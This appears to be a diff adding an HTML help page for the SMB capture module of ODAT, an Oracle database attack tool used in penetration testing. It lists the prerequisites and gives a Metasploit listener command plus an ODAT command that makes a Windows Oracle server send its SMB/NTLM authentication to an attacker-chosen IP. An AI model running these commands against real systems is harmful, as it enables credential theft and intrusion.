@@ -1,0 +1,20 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>smb</title>
+</head><body>Capture SMB authentication <br/>
+This module allows to capture a SMB authentication.<br/>
+&nbsp;<br/>
+Prerequisite in order to capture a challenge:<br/>
+&nbsp;<ul><li>&nbsp;Oracle Database must be installed on <b>Windows</b>&nbsp;</li>
+<li>Oracle Database services must <b>not</b>&nbsp;used a Windows <b>network service</b>&nbsp;account, a <b>system</b>&nbsp;account or a <b>local service</b>&nbsp;account.</li>
+</ul>
+<br/>
+Notice: To use this module, a tool to capture SMB authentication must be used (e.g. <i><a href="https://www.rapid7.com/db/modules/auxiliary/server/capture/smb">metasploit</a></i>&nbsp;or <i><a href="https://github.com/SpiderLabs/Responder">responder</a></i>).<br/>
+&nbsp;<ul><li>&nbsp;In this example, I have used the <i>auxiliary/server/capture/smb</i>&nbsp;metasploit module to capture the SMB authentication:</li>
+</ul>
+msfconsole [...] msf auxiliary(smb) &gt; use auxiliary/server/capture/smb msf auxiliary(smb) &gt; run <br/>
+<ul><li>&nbsp;To make connect the Oracle Database server to our smb server, the following ODAT command can be used :</li>
+</ul>
+./odat.py smb -s $SERVER -d $SID -U $USER -P $PASSWORD --capture $MY-IP-ADDRESS SHARE-NAME &nbsp;</body></html>
